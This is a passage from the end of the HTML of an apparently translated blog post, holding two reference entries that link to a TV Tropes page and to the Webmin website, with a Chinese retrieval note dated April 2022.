class="ae kp" href="https://tvtropes.org/pmwiki/pmwiki.php/Main/SmallGirlBigGun" rel="noopener ugc nofollow" target="_blank">https://tvtropes.org/pmwiki/pmwiki.php/Main/SmallGirlBigGun</a></p><p id="384a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">网名(未注明)。2022年4月1日检索自:<a class="ae kp" href="https://www.webmin.com/" rel="noopener ugc nofollow" target="_blank">https://www.webmin.com/</a></p></div></div>    
</body>
</html>